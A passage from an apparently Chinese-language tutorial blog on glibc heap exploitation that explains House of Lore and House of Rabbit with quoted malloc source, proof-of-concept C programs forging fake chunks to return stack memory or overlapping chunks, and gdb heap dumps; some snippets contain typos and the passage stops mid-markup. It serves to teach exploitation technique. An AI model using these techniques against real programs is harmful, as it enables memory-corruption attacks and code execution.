第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，它通过<code>bck = victim-&gt;bk;</code>来通过最后一个chunk获取倒数第二个chunk，并且对其进行了一个简单的校验：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能够控制最后一个chunk的bk指针指向内存中构造的fake chunk，并且其fake chunk-&gt;fd指向最后一个chunk，则可以成功的将 small bin 的 bk 设置为fake chunk，下一次malloc时即可申请到伪造的chunk。</p>
<p>此时的smallbin(图中虚线为last chunk原有结构，红线为修改后)</p>
<img src="C:\Users\She11c4T\Desktop\堆溢出相关\houseoflore原理图.png" style="zoom:50%;" />

<p>不过这里还需要注意，下一次malloc时，fake chunk位于small bin的队列首部，会同样通过<code>bck = victim-&gt;bk;</code>来找倒数第二个chunk，所以需要确保我们的目的fake chunk-&gt;bk指向的fake chunk2，满足fake chunk2-&gt;fd ==fake_chunk,否则申请fake_chunk时会再次被检测到。</p>
<p>实例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体步骤：</p>
<ul>
<li><p>申请一个可控的small chunk (称之为victim的话)</p>
<ul>
<li>为了防止在free时与top chunk 合并， 需要在后面申请一个large chunk。</li>
<li>之后free掉victim，会被放入unsorted bin</li>
</ul>
</li>
<li><p>栈上伪造两个chunk</p>
<ul>
<li>一个是我们要用到的目标fake chunk，将其fd指向原来small bin的victim,bk指向fake chunk2，绕过检查</li>
<li>一个是用来绕过malloc检测的fake chunk2，其fd指向fake chunk，绕过检查</li>
</ul>
</li>
<li><p>申请一个无法处理的chunk，让malloc将victim从unsorted bin中取出</p>
</li>
<li><p>将victim的bk改为fake chunk，绕过检查</p>
</li>
<li><p>再次malloc一个对应大小的chunk，申请到fake chunk，实现任意地址读写</p>
</li>
</ul>
<h3 id="House-of-Rabbit-glibc2-26及以下"><a href="#House-of-Rabbit-glibc2-26及以下" class="headerlink" title="House of Rabbit(glibc2.26及以下)"></a>House of Rabbit(glibc2.26及以下)</h3><p>一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前面讲过，fastbin 中的chunk 在分配时是有限制的，如果size和index对应的不同就会报错，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">#<span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>而这个技术正是利用了<code>malloc_consolidate</code>过程中并没有对fastbin 的size进行检查，由此，如果修改掉fast bin chunk的size 后触发<code>malloc_consolidate</code>(比如通过malloc large chunk等方式即可)会导致fastbin的chunk合并， 达到overlapping效果。</p>
<h5 id="修改chunk的size"><a href="#修改chunk的size" class="headerlink" title="修改chunk的size"></a>修改chunk的size</h5><ul>
<li>申请了两个chunk</li>
<li>修改chunk1的size 覆盖chunk2</li>
<li>触发<code>malloc_consolidate</code>，两个chunk按照大小都会被放入small bin ，但由于并没有检查大小，所以chunk1会把chunk2包含其中</li>
<li>之后申请chunk2，则其头部会被完全控制。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602050</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="comment">/* Heap layout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 (&#x27;Q&#x27;)</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">..... </span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 (&#x27;Q&#x27;)</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">...... </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x21 (&#x27;!&#x27;)</span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>; <span class="comment">//modify chunk1 size to be 0xa1</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>);  <span class="comment">//allocate a large chunk, trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*Chunk1 overlap with chunk2 now</span></span><br><span class="line"><span class="comment">gdb-peda$ telescope 0x602000 100</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0xa1 </span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0024| 0x602018 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0032| 0x602020 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">.....</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x51 (&#x27;Q&#x27;)</span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0120| 0x602078 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">....</span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0xa0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x20 (&#x27; &#x27;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x603450 (size : 0x1fbb0) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">            unsortbin: 0x0</span></span><br><span class="line"><span class="comment">(0x050)  smallbin[ 3]: 0x602050</span></span><br><span class="line"><span class="comment">(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h5 id="修改chunk的fd指针"><a href="#修改chunk的fd指针" class="headerlink" title="修改chunk的fd指针"></a>修改chunk的fd指针</h5><ul>
<li>申请两个chunk<ul>
<li>一个是放入fastbin 的chunk1；一个是用来伪造chunk的大的chunk2</li>
</ul>
</li>
<li>将chunk2中伪造为几个chunk(chunk3  chunk4…)，size的prev_inuse需要为1，防止合并</li>
<li>free掉chunk1<ul>
<li>此时fast bin为：chunk1</li>
</ul>
</li>
<li>修改chunk1的fd为chunk3<ul>
<li>此时fastbin：chunk1-&gt;chunk3</li>
</ul>
</li>
<li>触发<code>malloc_consolidate</code>，chun1和chunk3都会放入small bin</li>
<li>申请到chunk3</li>
<li>chunk3此时完全位于chunk2中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//0x602000</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>  <span class="comment">//fake chunk&#x27;s next chunk</span></span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span> <span class="comment">//fake chunk&#x27;s next chunk&#x27;s next chuck</span></span><br><span class="line"><span class="comment">/* Heap laylout</span></span><br><span class="line"><span class="comment">0000| 0x602000 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0008| 0x602008 --&gt; 0x51 (&#x27;Q&#x27;)</span></span><br><span class="line"><span class="comment">0016| 0x602010 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0080| 0x602050 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0088| 0x602058 --&gt; 0x111 </span></span><br><span class="line"><span class="comment">0096| 0x602060 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0104| 0x602068 --&gt; 0x31 (&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment">0112| 0x602070 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0144| 0x602090 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0152| 0x602098 --&gt; 0x21 (&#x27;!&#x27;)</span></span><br><span class="line"><span class="comment">0160| 0x6020a0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0168| 0x6020a8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0176| 0x6020b0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0184| 0x6020b8 --&gt; 0x21 (&#x27;!&#x27;)</span></span><br><span class="line"><span class="comment">0192| 0x6020c0 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">0352| 0x602160 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">0360| 0x602168 --&gt; 0x20ea1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line">chuck1[<span class="number">0</span>]=<span class="number">0x602060</span>;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment">(0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment">(0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment">(0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment">(0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment">(0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment">(0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment">(0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment">                  top: 0x6034f0 (size : 0x1fb10) </span></span><br><span class="line"><span class="comment">       last_remainder: 0x0 (size : 0x0) </span></span><br><span 